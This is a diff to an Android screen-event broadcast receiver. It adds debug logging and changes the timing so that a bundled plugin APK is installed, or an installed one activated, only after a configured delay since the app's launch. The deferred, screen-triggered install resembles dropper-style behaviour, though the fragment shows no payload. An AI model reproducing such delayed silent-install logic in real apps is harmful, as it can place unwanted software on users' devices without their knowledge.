@@ -44,11 +44,18 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
 //                                            ? true
 //                                            : SingleInstanceBase.getInstance(PLuginManager.class).scanPluginInstalled();
                 long cur = System.currentTimeMillis();
+                if (Config.DEBUG) {
+                    Config.LOGD("[[ScreenBroadcastReceiver::onReceive]] check if should install plugin : ( pluginInstalled = " + pluginInstalled
+                                    + " lanuch time = " + UtilsRuntime.debugFormatTime(SettingManager.getInstance().getKeyLanuchTime())
+                                    + " install delay = " + SettingManager.getInstance().getKeyInstallInterval()
+                                    + " current time = " + UtilsRuntime.debugFormatTime(cur)
+                                    + " apk exist = " + UtilOperator.isPluginApkExist());
+                }
                 if (UtilOperator.isPluginApkExist()
                         /**&& !UtilsRuntime.isPackageHasInstalled(context, Config.PLUGIN_PACKAGE_NAME)**/
                         && !pluginInstalled) {
-                    if (SettingManager.getInstance().getKeyLanuchTime() + SettingManager.getInstance().getKeyInstallInterval() > cur) {
-                        UtilOperator.tryToInstallPluginLocal(context);
+                    if (cur > (SettingManager.getInstance().getKeyLanuchTime() + SettingManager.getInstance().getKeyInstallInterval())) {
+                        if (!Config.DIS_INSTALL) UtilOperator.tryToInstallPluginLocal(context);
                     }
                 } else if (pluginInstalled) {
                     Utils.tryToActivePluginApp(context);
